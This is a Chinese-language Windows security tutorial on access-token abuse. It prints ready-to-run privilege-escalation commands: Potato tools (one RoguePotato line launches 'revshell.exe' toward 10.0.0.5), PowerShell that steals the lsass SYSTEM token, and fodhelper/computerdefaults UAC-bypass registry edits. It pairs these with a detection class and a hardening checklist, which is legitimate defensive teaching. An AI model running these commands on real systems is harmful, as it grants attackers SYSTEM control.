# Windows 令牌操纵与权限提升

> Windows 访问令牌的攻击与防御

---

## 1. Windows 访问令牌基础

```
Windows 令牌结构:
┌────────────────────────────────────────────┐
│              访问令牌 (Access Token)        │
├────────────────┬───────────────────────────┤
│  用户 SID      │  S-1-5-21-...-1001        │
│  组 SID        │  Administrators, Users...  │
│  权限          │  SeDebugPrivilege...       │
│  完整性级别     │  High / Medium / Low       │
│  登录会话       │  Session ID                │
│  限制 SID      │  WRITE RESTRICTED          │
│  令牌类型      │  Primary / Impersonation   │
└────────────────┴───────────────────────────┘
```

---

## 2. 令牌窃取 (Token Impersonation)

```powershell
# 查看当前令牌权限
whoami /priv

# 关键权限 (有任一即可提权):
# SeImpersonatePrivilege  ← IIS/Service 账户常有
# SeAssignPrimaryTokenPrivilege  ← 同上
# SeDebugPrivilege  ← Administrator
# SeBackupPrivilege  ← Backup Operators
# SeRestorePrivilege  ← Backup Operators
# SeTakeOwnershipPrivilege  ← Administrator
```

### Potato 家族攻击
```bash
# Juicy Potato: 利用 SeImpersonate + COM 服务 (CLSID)
JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" \
  -a "/c whoami > C:\temp\result.txt" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

# Rogue Potato: 利用远程 OXID 解析
RoguePotato.exe -r 10.0.0.5 -e "revshell.exe" -l 9999

# PrintSpoofer: 利用 Printer Bug + Named Pipe
PrintSpoofer64.exe -i -c "powershell -enc <Base64>"

# EfsPotato: 利用 EFS RPC (CVE未分配)
EfsPotato.exe "cmd.exe /c whoami"
# → NT AUTHORITY\SYSTEM
```

### Token 枚举与窃取
```powershell
# 1. 枚举所有进程 → 查找 SYSTEM 令牌
Get-Process -IncludeUserName | Where-Object { $_.UserName -eq "NT AUTHORITY\SYSTEM" }

# 2. 使用 PowerShell 窃取令牌
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TokenMan {
    [DllImport("advapi32.dll")]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle, uint DesiredAccess,
        out IntPtr TokenHandle
    );
    [DllImport("advapi32.dll")]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel,
        int TokenType, out IntPtr phNewToken
    );
    [DllImport("advapi32.dll")]
    public static extern bool ImpersonateLoggedOnUser(
        IntPtr hToken
    );
}
"@

# 3. 打开 SYSTEM 进程令牌 → 复制 → 模拟
$proc = Get-Process -Name lsass -ErrorAction SilentlyContinue
$hToken = 0
[TokenMan]::OpenProcessToken($proc.Handle, 0xF01FF, [ref]$hToken)
$hDupToken = 0
[TokenMan]::DuplicateTokenEx($hToken, 0xF01FF, [IntPtr]::Zero, 2, 1, [ref]$hDupToken)
[TokenMan]::ImpersonateLoggedOnUser($hDupToken)
whoami
# → nt authority\system
```

---

## 3. UAC 绕过

```powershell
# UAC 绕过: DLL 劫持
# 高位进程加载不受保护的 DLL 路径
# 将恶意 DLL 放在搜索路径中 → 以高位权限执行

# fodhelper.exe 绕过 (Windows 10/11)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe /c start C:\Windows\System32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /d "" /f
Start-Process fodhelper.exe

# computerdefaults.exe 绕过
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe"
Start-Process computerdefaults.exe
```

---

## 4. 权限提升检测

```python
class PrivilegeEscalationDetector:
    """检测可疑的令牌操纵行为"""

    RULES = [
        {
            'name': 'Token Stealing',
            'event_ids': [4672, 4674],
            'condition': lambda e: (
                'SeImpersonatePrivilege' in e.get('privileges', []) and
                e.get('process_name') not in WHITELISTED
            ),
            'severity': 'HIGH'
        },
        {
            'name': 'UAC Bypass',
            'event_ids': [4688],
            'condition': lambda e: (
                e.get('integrity_level') == 'High' and
                e.get('parent_process') == 'explorer.exe' and
                e.get('command_line') and
                any(b in str(e['command_line']).lower()
                    for b in ['fodhelper', 'computerdefaults',
                              'eventvwr', 'sdclt', 'wusa'])
            ),
            'severity': 'CRITICAL'
        },
        {
            'name': 'Process Injection',
            'event_ids': [10],  # Sysmon
            'condition': lambda e: (
                e.get('EventID') == 10 and
                e.get('SourceImage') != e.get('TargetImage') and
                not e.get('GrantedAccess', '').startswith('0x1')
            ),
            'severity': 'HIGH'
        }
    ]

    def analyze_event(self, event):
        findings = []
        for rule in self.RULES:
            if rule['condition'](event):
                findings.append({
                    'rule': rule['name'],
                    'severity': rule['severity'],
                    'timestamp': event['timestamp']
                })
        return findings
```

---

## 5. 防御矩阵

```yaml
Windows 令牌安全加固:

  最小权限:
    - 服务账户: 仅授予必要的权限
    - 移除 IIS/Service 的 SeImpersonate
    - 移除 Backup Operators 的 SeBackup

  UAC:
    - 保持默认 (不关闭 UAC!)
    - 始终通知 (最高级别)
    - Admin Approval Mode: 启用

  监控:
    - Sysmon Event ID 10 (进程访问)
    - Event 4672 (特殊权限登录)
    - Event 4688 (新进程创建)
    - 检测: SeImpersonate + 非白名单进程

  端点保护:
    - Windows Defender Credential Guard
    - LSA Protection (RunAsPPL)
    - AppLocker / WDAC
    - Attack Surface Reduction (ASR) Rules
```

---

*上一篇：[Windows 进程与线程安全](03-process-thread-security.md)*
